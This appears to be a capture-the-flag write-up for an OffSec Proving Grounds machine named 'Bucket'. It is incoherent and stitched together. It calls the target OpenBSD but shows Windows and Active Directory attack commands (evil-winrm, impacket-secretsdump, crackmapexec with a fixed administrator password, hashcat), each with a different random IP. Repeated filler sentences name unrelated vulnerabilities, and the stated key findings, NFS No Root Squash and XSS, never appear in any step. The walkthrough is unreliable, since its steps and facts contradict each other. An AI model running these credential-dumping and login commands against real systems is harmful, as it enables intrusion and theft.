---
TitleSEO: "OffSec Proving Grounds — Bucket (Medium OpenBSD) | ZureFX"
TitlePost: "OffSec Proving Grounds — Bucket (Medium OpenBSD)"
Author: "ZureFX"
Description: "Full writeup for OffSec Proving Grounds Bucket. NFS No Root Squash and XSS to achieve medium compromise on OpenBSD."
Keywords: "reversing, windows, linux, tryhackme, offsec, medium"
URL: "https://zurefx.github.io/writeups/htb-bucket-185.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-bucket-185/"
Date: "2024-05-08"
Tags: "Reversing, Windows, Linux, TryHackMe, OffSec, Medium"
Section: "writeups"
Lang: "en"
main_img: "htb-bucket-185"
Permalink: "/writeups/htb-bucket-185.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Bucket** is rated **Medium** on OffSec Proving Grounds. It runs **OpenBSD** and the IP address during this analysis was `10.24.231.75`.

### Objectives

Initial enumeration revealed several interesting open ports on the target. Group Policy Preferences contained encrypted but recoverable credentials.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
gobuster dir -u http://10.21.179.21/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
gobuster dir -u http://10.94.195.135/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
feroxbuster -h
gobuster dir -u http://10.42.118.17/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

The scheduled task ran with elevated privileges and could be abused for escalation. The service account had excessive permissions assigned in Active Directory.

### Service Enumeration

Authentication bypass was achieved through careful manipulation of the login mechanism. The application stored sensitive credentials in an unencrypted configuration file. Authentication bypass was achieved through careful manipulation of the login mechanism.

```bash
evil-winrm -i 10.99.103.13 -u administrator -p 'P@ssw0rd!'
crackmapexec smb 10.39.17.107 -u administrator -p 'P@ssw0rd!' --shares
```

The kernel version was outdated and vulnerable to a publicly known exploit. The application stored sensitive credentials in an unencrypted configuration file.

### SMB Enumeration

The service account had excessive permissions assigned in Active Directory. The service was running without proper input validation, leading to injection vulnerabilities.

```bash
feroxbuster -h
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.48.179.18
```

Weak file permissions allowed modification of critical system files. The kernel version was outdated and vulnerable to a publicly known exploit. Command injection was possible through unsanitized user input in the search functionality.

## Exploitation

### Vulnerability Identification

Privilege escalation was possible due to misconfigured sudo permissions. The service account had excessive permissions assigned in Active Directory. Lateral movement was facilitated by reusing discovered credentials across services.

Key finding: **NFS No Root Squash**.

Post-exploitation enumeration revealed a path to domain administrator privileges. Network traffic analysis revealed unencrypted communications containing user credentials.

### Initial Access

Post-exploitation enumeration revealed a path to domain administrator privileges. The kernel version was outdated and vulnerable to a publicly known exploit.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.103.2.223
feroxbuster -h
crackmapexec smb 10.129.249.227 -u administrator -p 'P@ssw0rd!' --shares
evil-winrm -i 10.25.67.27 -u administrator -p 'P@ssw0rd!'
```

Unconstrained delegation was enabled on the compromised machine. The web application was vulnerable to Server-Side Template Injection (SSTI). The backup files contained sensitive information that should not have been accessible.

## Privilege Escalation

### Enumeration

Network traffic analysis revealed unencrypted communications containing user credentials. The target system was identified as running a vulnerable version of the service. Authentication bypass was achieved through careful manipulation of the login mechanism.

```powershell
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.25.121.39/FUZZ
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
crackmapexec smb 10.54.35.140 -u administrator -p 'P@ssw0rd!' --shares
```

### Exploitation

The scheduled task ran with elevated privileges and could be abused for escalation. Weak file permissions allowed modification of critical system files.

```powershell
impacket-secretsdump administrator:'P@ssw0rd!'@10.30.149.62
```

Command injection was possible through unsanitized user input in the search functionality. The web application was vulnerable to Server-Side Template Injection (SSTI).

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Privilege escalation was possible due to misconfigured sudo permissions. The database credentials were hardcoded in the application source code.

## Summary

### Tools Used

- `ligolo-ng`
- `feroxbuster`
- `nikto`
- `socat`
- `wmiexec`
- `sqlmap`

### Key Takeaways

- NFS No Root Squash
- XSS
